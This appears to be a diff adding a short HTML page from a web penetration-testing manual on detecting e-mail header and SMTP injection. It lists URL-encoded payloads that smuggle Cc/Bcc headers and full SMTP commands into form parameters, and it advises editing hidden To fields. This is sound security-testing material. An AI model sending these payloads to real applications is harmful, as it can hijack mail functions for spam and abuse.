@@ -1,0 +1,20 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b><span style="font-size: 14pt">DETECTION</span></b><span style="font-size: 12pt"><br/>
+</span><ul><li>You should submit each of the following test strings as each parameter in turn, inserting your own e-mail address at the relevant position:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><tt><li><b>testmail@airmail.cc</b>%0aCc:<b>testmail@airmail.cc</b></li>
+<li><b>testmail@airmail.cc</b>%0d%0aCc:<b>testmail@airmail.cc</b></li>
+<li><b>testmail@airmail.cc</b>%0aBcc:<b>testmail@airmail.cc</b></li>
+<li><b>testmail@airmail.cc</b>%0d%0aBcc:<b>testmail@airmail.cc</b></li>
+</tt><li><tt>%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<b>testmail@airmail.cc</b>%0aRCPT+TO:+<b>testmail@airmail.cc</b>%0aDATA%0aFrom:+<b>testmail@airmail.cc</b>%0aTo:+<b>testmail@airmail.cc</b>%0aSubject:+test%0afoo%0a%2e%0a%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<b>testmail@airmail.cc</b>%0d%0aRCPT+TO:+<b>testmail@airmail.cc</b>%0d%0aDATA%0d%0aFrom:+<b>testmail@airmail.cc</b>%0d%0aTo:+<b>testmail@airmail.cc</b>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a</tt></li>
+</ul>
+</li>
+</ul>
+<ul><li>Note any error messages the application returns. If these appear to relate to any problem in the e-mail function, investigate whether you need to fine-tune your input to exploit a vulnerability.</li>
+<li>The application’s responses may not indicate in any way whether a vulnerability exists or was successfully exploited. You should monitor the e-mail address you specified to see if any mail is received.</li>
+<li>Review closely the HTML form that generates the relevant request. This may contain clues about the server-side software being used. It may also contain a hidden or disabled field that specifies the e-mail’s To address, which you can modify directly.</li>
+</ul>
+</body></html>
